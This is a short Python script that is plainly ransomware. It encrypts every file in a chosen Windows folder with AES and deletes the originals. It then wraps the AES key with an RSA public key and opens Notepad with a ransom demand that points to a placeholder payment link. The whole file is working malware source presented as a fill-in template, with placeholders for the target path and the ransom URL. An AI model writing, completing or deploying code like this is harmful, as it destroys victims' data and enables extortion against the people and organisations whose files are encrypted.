# Made by Hasan Hashim
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os
import subprocess

# Load the public key from file
with open("public_key.pem", "rb") as key_file:
    public_key = serialization.load_pem_public_key(key_file.read())

# Generate a random symmetric key and IV
symmetric_key = os.urandom(32)  # 256-bit key
iv = os.urandom(16)  # IV for encryption

# Encrypt the symmetric key using the public RSA key
encrypted_symmetric_key = public_key.encrypt(
    symmetric_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Write the encrypted symmetric key and IV to disk
with open("symmetric_key_encrypted", "wb") as key_file:
    key_file.write(encrypted_symmetric_key)
with open("iv_file", "wb") as iv_file:
    iv_file.write(iv)

def encrypt_files(directory):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):
            with open(file_path, "rb") as file:
                file_data = file.read()
            
            cipher = Cipher(algorithms.AES(symmetric_key), modes.CFB(iv))
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(file_data) + encryptor.finalize()

            with open(file_path + ".enc", "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            os.remove(file_path)

documents_path = "C:\\Users\\THE PATH TO ENCRYPT"
encrypt_files(documents_path)

# It Opens Notepad and write the ransom message in it
ransom_message = "All your files have been encrypted! Please go to this link to pay the ransom and decrypt your files: https://PUT_YOUR_URL.com"
temp_message_file_path = "ransom_message.txt"
with open(temp_message_file_path, "w") as message_file:
    message_file.write(ransom_message)

subprocess.run(["notepad.exe", temp_message_file_path])
